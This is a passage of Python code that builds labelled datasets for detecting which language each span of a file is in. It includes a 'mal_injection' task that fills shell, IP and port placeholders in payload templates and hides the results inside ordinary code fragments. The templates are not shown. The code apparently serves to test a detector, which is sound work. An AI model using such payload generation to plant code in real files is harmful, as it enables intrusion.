    for file_idx, row in enumerate(files):
        byte_len = int(row["byte_len"])
        if byte_len <= 0:
            continue
        byte_start = int(row["byte_start"])
        seg_start = int(row["seg_start"])
        seg_count = int(row["seg_count"])
        type_id = int(row["type_id"])

        # Reconstruct content from bytes using a 1:1 byte-to-char mapping so
        # that byte offsets from the memmap remain aligned with character
        # indices after normalization.
        file_slice = contents[byte_start : byte_start + byte_len]
        raw_chars = "".join(chr(int(b)) for b in np.asarray(file_slice, dtype=np.uint8))
        content = _normalize_text(raw_chars)
        if not content:
            continue

        # Build character-aligned segments from memmap byte offsets.
        doc_segments: List[dict] = []
        seg_slice = segments[seg_start : seg_start + seg_count]
        for seg in seg_slice:
            start = int(seg["start"])
            end = int(seg["end"])
            if end <= start:
                continue
            label_id = int(seg["label"])
            label_name = id2lang.get(label_id)
            if label_name is None:
                continue
            # Byte offsets map 1:1 to character indices under the above
            # normalization, so we can reuse them directly.
            doc_segments.append(
                {
                    "label": label_name,
                    "char_start": start,
                    "char_end": end,
                }
            )

        if not doc_segments:
            continue

        declared_lang = id2lang.get(type_id, "unknown")
        uid = f"memmap_b_{file_idx}"
        monitor_docs.append(
            MonitorDoc(
                declared_lang=declared_lang,
                content=content,
                segments=doc_segments,
                uid=uid,
                source="monitor_memmap_b",
                extra_meta={"split_name": meta.get("split_name", ""), "file_index": int(file_idx)},
            )
        )

        # Treat each full file as a fragment for its declared type; downstream
        # builders will handle any additional slicing/augmentation.
        fragments_by_lang.setdefault(declared_lang, []).append(
            Fragment(
                lang=declared_lang,
                content=content,
                uid=uid,
                extra_meta={"monitor_source": "monitor_memmap_b"},
            )
        )

    # Down-sample fragment pools per language for synthetic tasks
    target_per_lang = per_lang_target * max(1, int(extra_multiplier))
    if target_per_lang > 0:
        for lang, frags in list(fragments_by_lang.items()):
            if not frags:
                continue
            if len(frags) <= target_per_lang:
                continue
            rng.shuffle(frags)
            fragments_by_lang[lang] = frags[:target_per_lang]

    fragments_by_lang = {lang: frags for lang, frags in fragments_by_lang.items() if frags}

    if not fragments_by_lang and not monitor_docs:
        _log(f"⚠️  No monitor files found under memmap root {monitor_root}.")

    return fragments_by_lang, monitor_docs




def _features_schema() -> Features:
    return Features(
        {
            "task": Value("string"),
            "example_id": Value("string"),
            "content": Value("string"),
            "segments": SeqFeature(
                feature={
                    "label": Value("string"),
                    "char_start": Value("int32"),
                    "char_end": Value("int32"),
                }
            ),
            "source_langs": SeqFeature(feature=Value("string")),
            "metadata_json": Value("string"),
        }
    )


def _hash_example_id(task: str, lang: str, index: int, salt: Optional[str] = None) -> str:
    base = f"{task}|{lang}|{index}"
    if salt:
        base += f"|{salt}"
    digest = hashlib.sha256(base.encode("utf-8")).hexdigest()[:16]
    return f"{task}-{lang}-{index:05d}-{digest}"


def _segment(label: str, start: int, end: int) -> dict:
    return {"label": label, "char_start": int(start), "char_end": int(end)}


def _join_parts(parts: Iterable[Tuple[str, str]]) -> Tuple[str, List[dict], List[str]]:
    """Concatenate labelled text parts and return content, segments, labels."""

    segments: List[dict] = []
    langs: List[str] = []
    pieces: List[str] = []
    cursor = 0
    for label, text in parts:
        if not text:
            continue
        pieces.append(text)
        start = cursor
        cursor += len(text)
        segments.append(_segment(label, start, cursor))
        langs.append(label)
    combined = _normalize_text("".join(pieces))
    return combined, segments, langs


def _clean_snippet_text(text: str) -> str:
    if not text:
        return ""
    return text.replace("\r\n", "\n").replace("\r", "\n")


def _trim_text_to_budget(text: str, max_chars: int) -> str:
    if max_chars <= 0 or not text:
        return ""
    if len(text) <= max_chars:
        return text
    start = 0
    if len(text) > max_chars:
        start = random.randint(0, max(0, len(text) - max_chars))
    return text[start:start + max_chars]


def _sample_fragment_snippet(
    fragments_by_lang: Dict[str, List[Fragment]],
    lang: str,
    rng: random.Random,
    *,
    max_chars: int,
    min_letters: int = 0,
    strip: bool = False,
) -> Tuple[str, Optional[Fragment]]:
    pool = fragments_by_lang.get(lang)
    if not pool:
        return "", None
    for _ in range(12):
        fragment = rng.choice(pool)
        snippet = _clean_snippet_text(fragment.content)
        if strip:
            snippet = snippet.strip()
        if not snippet:
            continue
        snippet = _trim_text_to_budget(snippet, max_chars)
        if min_letters and _ascii_letter_count(snippet) < min_letters:
            continue
        return snippet, fragment
    return "", None


def _sample_fallback_text_fragment(
    fragments_by_lang: Dict[str, List[Fragment]],
    rng: random.Random,
    *,
    max_chars: int,
    min_letters: int = 0,
    min_length: int = 24,
    attempts: int = 24,
) -> Tuple[str, Optional[Fragment]]:
    """
    Fallback sampler that best-effort draws prose from the validation text pool.
    Mirrors the behaviour used during training so eval data stays consistent.
    """
    pool = fragments_by_lang.get("text")
    if not pool:
        return "", None
    for _ in range(attempts):
        fragment = rng.choice(pool)
        snippet = _clean_snippet_text(fragment.content)
        if not snippet:
            continue
        if len(snippet) > max_chars:
            start = rng.randint(0, max(0, len(snippet) - max_chars))
            snippet = snippet[start:start + max_chars]
        snippet = snippet.strip()
        if len(snippet) < min_length:
            continue
        if min_letters > 0 and _ascii_letter_count(snippet) < min_letters:
            continue
        return snippet, fragment
    return "", None


def _make_record(
    task: str,
    lang: str,
    index: int,
    content: str,
    segments: List[dict],
    source_langs: Sequence[str],
    metadata: dict,
) -> dict:
    content = _normalize_text(content)
    example_id = _hash_example_id(task, lang, index, salt=str(metadata.get("seed", "")))
    uniq_langs = sorted({lbl for lbl in source_langs if isinstance(lbl, str) and lbl})

    # HuggingFace encodes SeqFeature(struct) columns as a dict-of-lists, so
    # convert from our internal list-of-dicts representation.
    if isinstance(segments, dict):
        seg_value: Any = segments
    else:
        labels: List[str] = []
        starts: List[int] = []
        ends: List[int] = []
        for seg in segments:
            if not isinstance(seg, dict):
                continue
            labels.append(str(seg.get("label", "")))
            try:
                starts.append(int(seg.get("char_start", 0)))
                ends.append(int(seg.get("char_end", 0)))
            except (TypeError, ValueError):
                starts.append(0)
                ends.append(0)
        seg_value = {
            "label": labels,
            "char_start": starts,
            "char_end": ends,
        }

    return {
        "task": task,
        "example_id": example_id,
        "content": content,
        "segments": seg_value,
        "source_langs": uniq_langs,
        "metadata_json": json.dumps(metadata, sort_keys=True),
    }


def _classify_comment_lines(lines: Sequence[str]) -> List[bool]:
    """Return heuristic comment flags for each line."""
    flags: List[bool] = []
    inside_c_block = False
    inside_doc_block: Optional[str] = None
    inside_html_comment = False
    for line in lines:
        stripped = line.strip()
        lower = stripped.lower()
        is_comment = False

        if inside_doc_block:
            is_comment = True
            if inside_doc_block in stripped:
                occurrences = stripped.count(inside_doc_block)
                if occurrences % 2 == 1:
                    inside_doc_block = None
        elif inside_html_comment:
            is_comment = True
            if "-->" in line:
                inside_html_comment = False
        elif inside_c_block:
            is_comment = True
            if "*/" in line:
                inside_c_block = False
        else:
            if stripped.startswith("//") or stripped.startswith("#") or stripped.startswith("--") or stripped.startswith("%"):
                is_comment = True
            elif lower.startswith("rem "):
                is_comment = True
            elif stripped.startswith("<!--"):
                is_comment = True
                if "-->" not in stripped:
                    inside_html_comment = True
            elif stripped.startswith("*/"):
                is_comment = True
            elif stripped.startswith("/*"):
                is_comment = True
                if "*/" not in stripped or stripped.find("*/") < stripped.find("/*"):
                    inside_c_block = True
            else:
                comment_pos = stripped.find("/*")
                if comment_pos != -1:
                    if "*/" not in stripped[comment_pos + 2:]:
                        inside_c_block = True
                    if stripped[:comment_pos].strip() == "":
                        is_comment = True
            if stripped.startswith('"""') or stripped.startswith("'''"):
                is_comment = True
                delim = stripped[:3]
                quote_count = stripped.count(delim)
                if quote_count % 2 == 1:
                    inside_doc_block = delim

        flags.append(is_comment)
    return flags


def _select_line_block(
    text: str,
    min_bytes: int,
    max_bytes: Optional[int],
    rng: random.Random,
) -> Optional[dict]:
    """Select a contiguous set of whole lines that fit the byte window."""
    if not text:
        return None
    lines = text.splitlines(keepends=True)
    if not lines:
        return None
    flags = _classify_comment_lines(lines)
    letter_lengths = [_ascii_letter_count(line) for line in lines]

    candidates: List[dict] = []
    total_lines = len(lines)
    for start in range(total_lines):
        total_letters = 0
        comment_lines = 0
        snippet_lines: List[str] = []
        for end in range(start, total_lines):
            snippet_lines.append(lines[end])
            total_letters += letter_lengths[end]
            if flags[end]:
                comment_lines += 1

            if total_letters < min_bytes:
                continue
            if max_bytes is not None and total_letters > max_bytes:
                break

            non_comment_count = len(snippet_lines) - comment_lines
            if non_comment_count <= 0:
                continue
            comment_ratio = comment_lines / len(snippet_lines)
            if comment_ratio > _MAX_NEEDLE_COMMENT_RATIO:
                continue

            snippet_text = "".join(snippet_lines)
            if not snippet_text.strip():
                continue

            candidates.append(
                {
                    "start_line": start,
                    "end_line": end + 1,
                    "text": snippet_text,
                    "visible_chars": total_letters,
                    "letter_chars": total_letters,
                    "comment_ratio": comment_ratio,
                    "comment_lines": comment_lines,
                    "total_lines": len(snippet_lines),
                }
            )

    if not candidates:
        return None

    min_ratio = min(candidate["comment_ratio"] for candidate in candidates)
    relaxed = [c for c in candidates if c["comment_ratio"] <= min_ratio + 0.1]
    chosen = rng.choice(relaxed if relaxed else candidates)
    return chosen


def _random_shell(rng: random.Random) -> str:
    return rng.choice(_PAYLOAD_SHELL_CHOICES)


def _random_ip(rng: random.Random) -> str:
    return ".".join(str(rng.randint(11, 223)) for _ in range(4))


def _random_port(rng: random.Random) -> int:
    return rng.randint(1024, 65535)


def _truncate_payload(snippet: str) -> str:
    if _visible_char_count(snippet) <= _PAYLOAD_MAX_VISIBLE:
        return _normalize_text(snippet)

    import re

    tokens = list(re.finditer(r"\S+", snippet, re.MULTILINE))
    if not tokens:
        data = snippet.encode("utf-8", "ignore")
        cut = data[: _PAYLOAD_MAX_VISIBLE].decode("utf-8", "ignore")
        return _normalize_text(cut)

    best = None
    best_visible = 0

    for start_idx, start_match in enumerate(tokens):
        start = start_match.start()
        for end_idx in range(start_idx, len(tokens)):
            end = tokens[end_idx].end()
            candidate = snippet[start:end]
            visible = _visible_char_count(candidate)
            if visible <= _PAYLOAD_MAX_VISIBLE and visible > best_visible:
                best = (start, end_idx)
                best_visible = visible
            if visible > _PAYLOAD_MAX_VISIBLE:
                break

    if best is None:
        data = snippet.encode("utf-8", "ignore")
        cut = data[: _PAYLOAD_MAX_VISIBLE].decode("utf-8", "ignore")
        return _normalize_text(cut)

    start, end_token_idx = best
    end = tokens[end_token_idx].end()
    trailing = snippet[end:]
    for offset, ch in enumerate(trailing):
        if not ch.isspace():
            break
        candidate = snippet[start : end + offset + 1]
        if _visible_char_count(candidate) <= _PAYLOAD_MAX_VISIBLE:
            end = end + offset + 1
        else:
            break

    truncated = snippet[start:end]
    return _normalize_text(truncated)


def _generate_payload_snippet(payload_lang: str, rng: random.Random) -> Optional[str]:
    options = malicious_injections_to_discover.get(payload_lang)
    if not options:
        return None
    template = rng.choice(options)
    shell = _random_shell(rng)
    ip = _random_ip(rng)
    port = _random_port(rng)
    snippet = template.replace("{shell}", shell).replace("{ip}", ip).replace("{port}", str(port))
    snippet = _truncate_payload(snippet.strip("\n"))
    return snippet if snippet else None


def _build_pure_dataset(
    fragments_by_lang: Dict[str, List[Fragment]],
    per_label: int,
) -> Tuple[str, List[dict], str]:
    task = "pure_fragments"
    examples: List[dict] = []
    desc = "Single-label monitor fragments (baseline accuracy)."
    for lang, frags in fragments_by_lang.items():
        limit = min(per_label, len(frags))
        for idx in range(limit):
            frag = frags[idx]
            content = frag.content
            segments = [_segment(lang, 0, len(content))]
            meta = {
                "host_lang": lang,
                "host_uid": frag.uid,
                "source_meta": frag.extra_meta,
            }
            record = _make_record(task, lang, idx, content, segments, [lang], meta)
            examples.append(record)
    return task, examples, desc


def _choose_injection(
    fragments_by_lang: Dict[str, List[Fragment]],
    host_lang: str,
    rng: random.Random,
    min_bytes: int,
    max_bytes: Optional[int],
) -> Optional[Tuple[str, Fragment, dict]]:
    donor_langs = [
        lang
        for lang in fragments_by_lang.keys()
        if lang != host_lang
        and fragments_by_lang[lang]
        and lang.lower() not in _PROHIBITED_INJECTION_LANGS
    ]
    if not donor_langs:
        return None

    for _ in range(100):
        d_lang = rng.choice(donor_langs)
        donor = rng.choice(fragments_by_lang[d_lang])
        snippet_info = _select_line_block(donor.content, min_bytes, max_bytes, rng)
        if snippet_info:
            return d_lang, donor, snippet_info
    return None


def _build_injection_dataset(
    fragments_by_lang: Dict[str, List[Fragment]],
    per_label: int,
    bucket_name: str,
    min_bytes: int,
    max_bytes: Optional[int],
    rng: random.Random,
) -> Tuple[str, List[dict], str]:
    task = f"needle_{bucket_name}"
    desc = (
        "Host fragments with a foreign-language needle injection sized "
        f"{min_bytes}-{'∞' if max_bytes is None else max_bytes} printable chars (whitespace ignored)."
    )
    examples: List[dict] = []
    _log(f"💉 Building injection dataset for size {min_bytes}-{'∞' if max_bytes is None else max_bytes} bytes...")

    for lang, frags in fragments_by_lang.items():
        if not frags:
            continue
        limit = min(per_label, len(frags))
        if limit == 0:
            continue
        for idx in range(limit):
            host = frags[idx]
            inj = _choose_injection(fragments_by_lang, lang, rng, min_bytes, max_bytes)
            if not inj:
                continue
            donor_lang, donor_frag, snippet_info = inj
            if donor_lang == lang:
                continue
            snippet = snippet_info.get("text")
            if not snippet:
                continue
            host_text = host.content
            if not host_text:
                continue
            insert_at = rng.randrange(0, len(host_text) + 1)
            left = host_text[:insert_at]
            right = host_text[insert_at:]
            parts = []
            if left:
                parts.append((lang, left))
            parts.append((donor_lang, snippet))
            if right:
                parts.append((lang, right))
            content, segments, langs = _join_parts(parts)
            inj_letters = _ascii_letter_count(snippet)
            inj_raw_bytes = len(snippet.encode("utf-8", "ignore"))
            meta = {
                "host_lang": lang,
                "host_uid": host.uid,
                "donor_lang": donor_lang,
                "donor_uid": donor_frag.uid,
                "insertion_char": insert_at,
                "injection_visible_chars": inj_letters,
                "injection_letter_chars": inj_letters,
                "injection_bytes": inj_raw_bytes,
                "injection_lines": snippet_info.get("total_lines"),
                "injection_comment_lines": snippet_info.get("comment_lines"),
                "injection_comment_ratio": snippet_info.get("comment_ratio"),
                "donor_start_line": snippet_info.get("start_line"),
                "donor_end_line": snippet_info.get("end_line"),
                "size_bucket": bucket_name,
            }
            record = _make_record(task, lang, idx, content, segments, langs, meta)
            examples.append(record)

    return task, examples, desc


def _build_monitor_needle_dataset(
    monitor_docs: Sequence[MonitorDoc],
    per_label: int,
    bucket_name: str,
    min_bytes: int,
    max_bytes: Optional[int],
    rng: random.Random,
) -> Tuple[str, List[dict], str]:
    """Build needle-in-the-haystack datasets from natural monitor segments.

    Instead of synthetic injections, this groups real short foreign-language
    segments from the monitor set into size buckets.
    """
    task = f"needle_{bucket_name}"
    desc = (
        "Natural monitor files with a short foreign-language needle sized "
        f"{min_bytes}-{'∞' if max_bytes is None else max_bytes} printable chars (whitespace ignored)."
    )
    examples: List[dict] = []
    _log(
        f"💉 Building monitor needle dataset for size {min_bytes}-"
        f"{'∞' if max_bytes is None else max_bytes} bytes..."
    )

    # Collect candidate (host_lang -> [ (MonitorDoc, donor_label) ])
    candidates: Dict[str, List[Tuple[MonitorDoc, str]]] = {}
    for doc in monitor_docs:
        if not doc.segments or len(doc.segments) < 2:
            continue

        # Compute total chars per label to pick a reasonable host language.
        length_per_label: Dict[str, int] = {}
        for seg in doc.segments:
            label = str(seg.get("label", ""))
            start = int(seg.get("char_start", 0))
            end = int(seg.get("char_end", start))
            if end <= start:
                continue
            length_per_label[label] = length_per_label.get(label, 0) + (end - start)
        if len(length_per_label) < 2:
            continue

        host_lang = max(length_per_label.items(), key=lambda kv: kv[1])[0]
        # For each foreign label, require exactly one contiguous segment so the
        # "needle" is well-defined.
        segments_by_label: Dict[str, List[dict]] = {}
        for seg in doc.segments:
            label = str(seg.get("label", ""))
            segments_by_label.setdefault(label, []).append(seg)

        for donor_label, seg_list in segments_by_label.items():
            if donor_label == host_lang:
                continue
            if len(seg_list) != 1:
                # Skip documents where the donor language appears multiple times;
                # metrics would otherwise treat the union of all segments.
                continue
            seg = seg_list[0]
            start = int(seg.get("char_start", 0))
            end = int(seg.get("char_end", start))
            if end <= start:
                continue
            snippet = doc.content[start:end]
            letters = _ascii_letter_count(snippet)
            if letters < min_bytes:
                continue
            if max_bytes is not None and letters > max_bytes:
                continue
            candidates.setdefault(host_lang, []).append((doc, donor_label))

    if not candidates:
        _log(f"⚠️  No natural monitor needles found for bucket {bucket_name}.")
        return task, examples, desc

    # Sample up to per_label documents per host language.
    for host_lang, host_candidates in candidates.items():
        if not host_candidates:
            continue
        rng.shuffle(host_candidates)
        limit = min(per_label, len(host_candidates))
        for idx in range(limit):
            doc, donor_label = host_candidates[idx]
            # Rebuild segments in the format expected by evaluation.
            segments = [
                _segment(str(seg.get("label", "")), int(seg.get("char_start", 0)), int(seg.get("char_end", 0)))
                for seg in doc.segments
            ]
            langs = sorted({seg["label"] for seg in segments if seg.get("label")})
            meta = {
                "host_lang": host_lang,
                "donor_lang": donor_label,
                "size_bucket": bucket_name,
                "monitor_source": doc.source,
            }
            record = _make_record(task, host_lang, idx, doc.content, segments, langs, meta)
            examples.append(record)

    return task, examples, desc


def _build_malicious_dataset(
    fragments_by_lang: Dict[str, List[Fragment]],
    per_label: int,
    rng: random.Random,
) -> Tuple[str, List[dict], str]:
    task = "mal_injection"
    desc = "Host fragments with malicious payload injections."
    examples: List[dict] = []
    payload_langs = [lang for lang, payloads in malicious_injections_to_discover.items() if payloads]
    if not payload_langs:
        return task, examples, desc

    _log("☠️  Building malicious injection dataset...")

    for host_lang, frags in fragments_by_lang.items():
        if not frags:
            continue
        available_payload_langs = [lang for lang in payload_langs if lang != host_lang]
        if not available_payload_langs:
            _log(f"⚠️  Skipping malicious payloads for '{host_lang}' — no distinct payload languages available.")
            continue
        limit = min(per_label, len(frags))
        if limit == 0:
            continue
        for idx in range(limit):
            host_frag = frags[idx]
            host_text = host_frag.content
            if not host_text:
                continue

            payload_lang = rng.choice(available_payload_langs)
            snippet = _generate_payload_snippet(payload_lang, rng)
            if not snippet:
                continue

            insert_at = rng.randrange(0, len(host_text) + 1)
            left = host_text[:insert_at]
            right = host_text[insert_at:]
            parts: List[Tuple[str, str]] = []
            if left:
                parts.append((host_lang, left))
            parts.append((payload_lang, snippet))
            if right:
                parts.append((host_lang, right))
            content, segments, langs = _join_parts(parts)
            payload_visible = _visible_char_count(snippet)
            payload_bytes = len(snippet.encode("utf-8", "ignore"))
            meta = {
                "host_lang": host_lang,
                "host_uid": host_frag.uid,
                "payload_lang": payload_lang,
                "payload_visible_chars": payload_visible,
                "payload_bytes": payload_bytes,
            }
            examples.append(_make_record(task, host_lang, idx, content, segments, langs, meta))

    return task, examples, desc


def _build_pair_dataset(
    fragments_by_lang: Dict[str, List[Fragment]],
    per_label: int,
    rng: random.Random,
) -> Tuple[str, List[dict], str]:
    task = "sequence_pair"
    desc = "Two-language back-to-back sequences A->B."
    examples: List[dict] = []
    _log("🔄 Building sequence pair dataset...")
    labels = [lang for lang, frags in fragments_by_lang.items() if frags]
    for lang in labels:
        partners = [lbl for lbl in labels if lbl != lang]
        if not partners:
            continue
        host_list = fragments_by_lang[lang]
        limit = min(per_label, len(host_list))
        for idx in range(limit):
            host = host_list[idx]
            partner_lang = rng.choice(partners)
            partner_frag = rng.choice(fragments_by_lang[partner_lang])
            parts = [
                (lang, host.content.rstrip() + "\n\n"),
                (partner_lang, partner_frag.content.lstrip()),
            ]
            content, segments, langs = _join_parts(parts)
            meta = {
                "first_lang": lang,
                "second_lang": partner_lang,
                "host_uid": host.uid,
                "partner_uid": partner_frag.uid,
            }
            examples.append(_make_record(task, lang, idx, content, segments, langs, meta))
    return task, examples, desc


def _build_triplet_dataset(
    fragments_by_lang: Dict[str, List[Fragment]],
    per_label: int,
    rng: random.Random,
) -> Tuple[str, List[dict], str]:
    task = "sequence_triplet"
    desc = "Three-language back-to-back sequences A->B->C."
    examples: List[dict] = []
    _log("🔄 Building sequence triplet dataset...")
    labels = [lang for lang, frags in fragments_by_lang.items() if frags]
    for lang in labels:
        others = [lbl for lbl in labels if lbl != lang]
        if len(others) < 2:
            continue
        host_list = fragments_by_lang[lang]
        limit = min(per_label, len(host_list))
        for idx in range(limit):
            host = host_list[idx]
            partner_langs = rng.sample(others, 2)
            mid_frag = rng.choice(fragments_by_lang[partner_langs[0]])
            tail_frag = rng.choice(fragments_by_lang[partner_langs[1]])
            parts = [
                (lang, host.content.rstrip() + "\n\n"),
                (partner_langs[0], mid_frag.content.strip() + "\n\n"),
                (partner_langs[1], tail_frag.content.lstrip()),
            ]
            content, segments, langs = _join_parts(parts)
            meta = {
                "first_lang": lang,
                "second_lang": partner_langs[0],
                "third_lang": partner_langs[1],
                "host_uid": host.uid,
                "mid_uid": mid_frag.uid,
                "tail_uid": tail_frag.uid,
            }
            examples.append(_make_record(task, lang, idx, content, segments, langs, meta))
    return task, examples, desc


def _maybe_trim_text(text: str, max_chars: int = 512) -> str:
    if len(text) <= max_chars:
        return text
    head = max_chars // 2
    tail = max_chars - head
    return text[:head] + "\n…\n" + text[-tail:]


def _build_markdown_dataset(
    fragments_by_lang: Dict[str, List[Fragment]],
    per_label: int,
    rng: random.Random,
) -> Tuple[str, List[dict], str]:
    task = "markdown_mix"
    desc = "Markdown-like text/code interleavings with optional fences."
    examples: List[dict] = []
    _log("📝 Building markdown mix dataset...")
    labels = [lbl for lbl, frags in fragments_by_lang.items() if lbl != "text" and frags]
    text_available = bool(fragments_by_lang.get("text"))
    if not text_available:
        _log("⚠️  No 'text' fragments available; markdown dataset will omit prose blocks.")

    def _sample_text_paragraph(max_chars: int = 256) -> Tuple[str, Optional[Fragment], bool]:
        snippet, frag = _sample_fragment_snippet(
            fragments_by_lang, "text", rng, max_chars=max_chars, min_letters=12, strip=True
        )
        if not snippet:
            snippet, frag = _sample_fallback_text_fragment(
                fragments_by_lang,
                rng,
                max_chars=max_chars,
                min_letters=8,
                min_length=32,
            )
        if not snippet:
            snippet, frag = _sample_fallback_text_fragment(
                fragments_by_lang,
                rng,
                max_chars=max_chars,
                min_letters=0,
                min_length=8,
            )
        synthetic = False
        snippet = snippet.strip()
        return snippet, frag, synthetic

    for lang in labels:
        host_list = fragments_by_lang[lang]
        if not host_list:
            continue
        limit = min(per_label, len(host_list))
        alt_langs = [lbl for lbl in labels if lbl != lang]
        if not alt_langs:
            continue
        for idx in range(limit):
            host = host_list[idx]
            other_lang = rng.choice(alt_langs)
            other_pool = fragments_by_lang.get(other_lang)
            if not other_pool:
                continue
            other = rng.choice(other_pool)

            host_snippet = _clean_snippet_text(host.content).strip()
            host_snippet = _trim_text_to_budget(host_snippet, 540).strip()
            if not host_snippet:
                continue
            other_snippet = _clean_snippet_text(other.content).strip()
            other_snippet = _trim_text_to_budget(other_snippet, 360).strip()
            if not other_snippet:
                continue

            wrap_host = rng.random() < 0.5
            wrap_other = rng.random() < 0.5

            code_lids = [lbl for lbl in labels if fragments_by_lang.get(lbl)]

            content_chunks: List[str] = []
            segments: List[dict] = []
            langs_seen: List[str] = []
            cursor = 0

            inline_blocks: List[dict] = []
            markdown_blocks: List[dict] = []

            def append_part(label: str, text: str) -> Optional[dict]:
                nonlocal cursor
                if not text:
                    return None
                normalized = _normalize_text(text)
                if not normalized:
                    return None
                start = cursor
                end = start + len(normalized)
                content_chunks.append(normalized)
                seg = _segment(label, start, end)
                segments.append(seg)
                langs_seen.append(label)
                cursor = end
                return seg

            def append_markdown_text(
                paragraph: str,
                paragraph_frag: Optional[Fragment],
                synthetic: bool,
                role: str,
                *,
                suffix: str = "",
            ) -> None:
                if not (paragraph or suffix):
                    return

                embed = bool(code_lids) and rng.random() < _MARKDOWN_INLINE_CODE_PROB
                alt_pool = [lbl for lbl in code_lids if lbl != lang]
                if not embed or not alt_pool:
                    if paragraph:
                        append_part("text", paragraph)
                    if suffix:
                        append_part("text", suffix)
                    return

                alt_lang = rng.choice(alt_pool)
                alt_snippet_raw, alt_fragment = _sample_fragment_snippet(
                    fragments_by_lang, alt_lang, rng, max_chars=160, strip=True
                )
                alt_clean = alt_snippet_raw.strip()
                if not alt_clean:
                    if paragraph:
                        append_part("text", paragraph)
                    if suffix:
                        append_part("text", suffix)
                    return

                lang_token = alt_lang.replace("_", "")

                code_mode = rng.random()
                pre_markup: List[str]
                post_markup: List[str]
                code_text = ""
                wrapper_type = "inline_backtick"
                spacer_after = True
                display_label: Optional[str] = None

                if code_mode < 0.33:
                    inline_body = " ".join(alt_clean.split()).replace("`", "'")
                    inline_body = inline_body[:160]
                    if not inline_body:
                        if paragraph:
                            append_part("text", paragraph)
                        if suffix:
                            append_part("text", suffix)
                        return
                    pre_markup = ["`"]
                    post_markup = ["`"]
                    code_text = inline_body
                    wrapper_type = "inline_backtick"
                elif code_mode < 0.66:
                    fenced_body = alt_snippet_raw.strip("\n")
                    if not fenced_body:
                        if paragraph:
                            append_part("text", paragraph)
                        if suffix:
                            append_part("text", suffix)
                        return
                    if not fenced_body.endswith("\n"):
                        fenced_body += "\n"
                    pre_markup = [f"```{lang_token}\n"]
                    post_markup = ["```\n"]
                    code_text = fenced_body
                    wrapper_type = "inline_fence"
                    display_label = lang_token
                    spacer_after = False
                else:
                    html_body = alt_snippet_raw.replace("</code>", "&lt;/code&gt;")
                    if not html_body:
                        if paragraph:
                            append_part("text", paragraph)
                        if suffix:
                            append_part("text", suffix)
                        return
                    pre_markup = [f"<code class=\"language-{lang_token}\">"]
                    post_markup = ["</code>"]
                    code_text = html_body
                    wrapper_type = "html_code"

                content = paragraph or ""
                insertion = len(content) // 2
                if insertion < len(content):
                    while insertion < len(content) and not content[insertion].isspace():
                        insertion += 1
                if insertion >= len(content):
                    insertion = len(content) // 2
                    while insertion > 0 and not content[insertion - 1].isspace():
                        insertion -= 1

                prefix_text = content[:insertion]
                suffix_text = content[insertion:]

                if prefix_text:
                    append_part("text", prefix_text)
                if prefix_text and not prefix_text.endswith((" ", "\t", "\n")):
                    append_part("text", " ")

                for chunk in pre_markup:
                    append_part("text", chunk)

                code_seg = append_part(alt_lang, code_text)
                if code_seg:
                    inline_blocks.append(
                        {
                            "language": alt_lang,
                            "wrapper": wrapper_type,
                            "display_label": display_label,
                            "char_start": code_seg["char_start"],
                            "char_end": code_seg["char_end"],
                            "context_role": role,
                            "source_uid": alt_fragment.uid if alt_fragment else None,
                        }
                    )

                for chunk in post_markup:
                    append_part("text", chunk)

                trailing = suffix_text + suffix
                if spacer_after and trailing and not trailing[0].isspace():
                    append_part("text", " ")
                if trailing:
                    append_part("text", trailing)

            intro_text, intro_frag, intro_synth = _sample_text_paragraph(240)
            if rng.random() < 0.65:
                append_markdown_text(intro_text, intro_frag, intro_synth, "intro_text", suffix="\n\n")

            block_plan: List[Dict[str, Any]] = [
                {
                    "role": "host",
                    "language": lang,
                    "snippet": host_snippet,
                    "fragment": host,
                    "wrapped": wrap_host,
                }
            ]
            alt_block_snippet = other_snippet
            block_plan.append(
                {
                    "role": "other",
                    "language": other_lang,
                    "snippet": alt_block_snippet,
                    "fragment": other,
                    "wrapped": wrap_other,
                }
            )

            if len(block_plan) > 1 and rng.random() < 0.5:
                rng.shuffle(block_plan)

            host_block_meta: Optional[dict] = None
            other_block_meta: Optional[dict] = None

            for block_idx, block in enumerate(block_plan):
                block_role = block["role"]
                block_lang = block["language"]
                block_fragment = block["fragment"]
                block_snippet = block["snippet"]
                wrapped = bool(block.get("wrapped", False))

                include_lang = rng.random() < 0.85
                mismatch = include_lang and rng.random() < 0.2 and len(labels) > 1
                display_lang_name = ""
                display_token = ""
                if wrapped and include_lang:
                    candidate = block_lang
                    if mismatch:
                        alternatives = [lbl for lbl in labels if lbl != block_lang]
                        if alternatives:
                            candidate = rng.choice(alternatives)
                        else:
                            mismatch = False
                    display_lang_name = candidate
                    display_token = candidate.replace("_", "")

                snippet_body = block_snippet
                if rng.random() < 0.4:
                    snippet_body = snippet_body.strip()
                if not snippet_body.endswith("\n"):
                    snippet_body += "\n"
                if rng.random() < 0.25:
                    snippet_body = "\n".join(line.rstrip() for line in snippet_body.splitlines()) + "\n"

                if wrapped:
                    fence_prefix = "```"
                    if display_token:
                        fence_prefix += display_token
                        if rng.random() < 0.3:
                            fence_prefix += " "
                    fence_prefix += "\n"
                    if rng.random() < 0.1:
                        fence_prefix = fence_prefix.rstrip("\n")
                    append_part("text", fence_prefix)
                elif rng.random() < 0.2:
                    append_part("text", "```\n")

                code_segment = append_part(block_lang, snippet_body)

                closed = False
                if wrapped:
                    must_close = (block_idx != len(block_plan) - 1) or rng.random() < 0.8
                    if must_close:
                        closing = "```\n"
                        if rng.random() < 0.35:
                            closing = closing.rstrip("\n")
                        append_part("text", closing)
                        closed = True

                if code_segment:
                    block_entry = {
                        "role": block_role,
                        "wrapped": bool(wrapped),
                        "language": block_lang,
                        "display_label": display_token,
                        "display_language": display_lang_name,
                        "mismatched": bool(
                            wrapped
                            and include_lang
                            and mismatch
                            and display_lang_name
                            and display_lang_name != block_lang
                        ),
                        "char_start": code_segment["char_start"],
                        "char_end": code_segment["char_end"],
                        "source_uid": block_fragment.uid if block_fragment else None,
                        "wrapper": "wrapped" if wrapped else "plain",
                        "closed": closed,
                    }
                    markdown_blocks.append(block_entry)
                    if block_role == "host":
                        host_block_meta = block_entry
                    elif block_role == "other":
                        other_block_meta = block_entry

                if block_idx < len(block_plan) - 1 and rng.random() < 0.75:
                    between_text, between_frag, between_synth = _sample_text_paragraph(180)
                    joiner = "\n\n" if rng.random() < 0.5 else "\n"
                    append_markdown_text(between_text, between_frag, between_synth, "between_text", suffix=joiner)
                elif block_idx < len(block_plan) - 1 and rng.random() < 0.3:
                    append_part("text", "```\n")

            if rng.random() < 0.65:
                outro_text, outro_frag, outro_synth = _sample_text_paragraph(200)
                tail = "\n" if rng.random() < 0.7 else ""
